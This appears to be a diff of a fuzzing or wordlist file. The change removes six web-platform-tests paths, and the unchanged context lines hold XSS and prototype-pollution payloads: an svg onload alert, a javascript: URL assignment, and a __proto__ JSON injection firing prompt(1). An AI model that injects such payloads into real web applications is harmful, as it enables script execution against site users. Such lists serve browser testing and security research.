@@ -37,12 +37,6 @@ object.prototype.seal.html
 object.prototype.seal.html.ini
 object.prototype[symbol.tostringtag]='<svg/onload=alert(1)>';location='javascript:1+{}'
 object.prototype[symbol.tostringtag]='<svg/onload=alert(1)>';while(1){}location='javascript:1+{}'
-tests/wpt/web-platform-tests/js/builtins/object.prototype.freeze.html
-tests/wpt/web-platform-tests/js/builtins/object.prototype.getownpropertynames.html
-tests/wpt/web-platform-tests/js/builtins/object.prototype.hasownproperty-order.html
-tests/wpt/web-platform-tests/js/builtins/object.prototype.hasownproperty-prototype-chain.html
-tests/wpt/web-platform-tests/js/builtins/object.prototype.preventextensions.html
-tests/wpt/web-platform-tests/js/builtins/object.prototype.seal.html
 top.__proto__._= alert
 tostring.constructor.prototype.tostring=tostring.constructor.prototype.call;
 {"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
